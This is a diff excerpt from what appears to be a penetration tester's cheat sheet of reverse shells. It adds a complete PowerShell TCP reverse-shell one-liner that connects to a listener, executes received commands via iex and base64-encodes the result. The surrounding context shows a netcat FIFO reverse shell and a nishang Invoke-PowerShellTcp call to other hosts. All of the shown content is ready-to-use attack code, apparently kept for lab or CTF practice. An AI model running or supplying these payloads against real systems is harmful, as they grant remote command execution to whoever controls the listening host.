@@ -341,6 +341,11 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.110 1338 >/tmp/f
 
 ```
 ### Windows Shells
+RCE using PowerShell 
+
+echo -n "$client = New-Object System.Net.Sockets.TCPClient("192.168.45.167",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" | base64
+
+
 Added to the bottom of nishangs Invoke-PowerShellTcp.ps1 file
 ```bash
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.52 -Port 1337
